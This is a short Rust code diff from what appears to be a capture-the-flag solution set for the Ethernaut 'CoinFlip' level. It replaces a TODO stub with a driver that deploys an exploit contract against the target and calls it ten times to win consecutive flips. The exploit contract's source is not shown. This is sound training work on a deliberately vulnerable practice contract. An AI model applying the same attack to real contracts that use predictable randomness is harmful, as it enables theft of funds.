@@ -5,6 +5,7 @@
 //!
 //! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/CoinFlip.sol
 
+use alloy::sol;
 use async_trait::async_trait;
 use ctf::Actor;
 use ctf::ethereum::ethernaut::lvl03_coin_flip::*;
@@ -13,7 +14,7 @@ sol!(
     #[allow(missing_docs)]
     #[sol(rpc)]
     CoinFlipExploit,
-    "contracts/out/"
+    "out/CoinFlipExploit.sol/CoinFlipExploit.json"
 );
 
 pub struct Exploit;
@@ -27,8 +28,14 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        let exploit =
+            CoinFlipExploit::deploy(offender.provider(), target.address)
+                .await?;
+
+        for _ in 0..10 {
+            exploit.round().send().await?.watch().await?;
+        }
+
         Ok(())
     }
 }
